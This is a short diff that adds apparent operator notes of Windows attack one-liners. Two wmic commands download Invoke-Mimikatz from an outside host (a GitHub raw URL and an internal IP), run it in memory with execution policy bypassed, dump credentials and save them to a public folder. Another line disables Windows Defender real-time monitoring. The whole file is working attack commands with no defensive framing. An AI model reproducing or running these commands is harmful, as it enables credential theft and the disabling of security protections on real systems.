@@ -1,0 +1,11 @@
+#run mimikatz from a remote shell :D
+wmic process call create "powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\public\\a.txt"
+
+#turn off win defender in powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+#local invoke
+wmic process call create "powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.108.2.95/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\public\\a.txt"
+
+
+
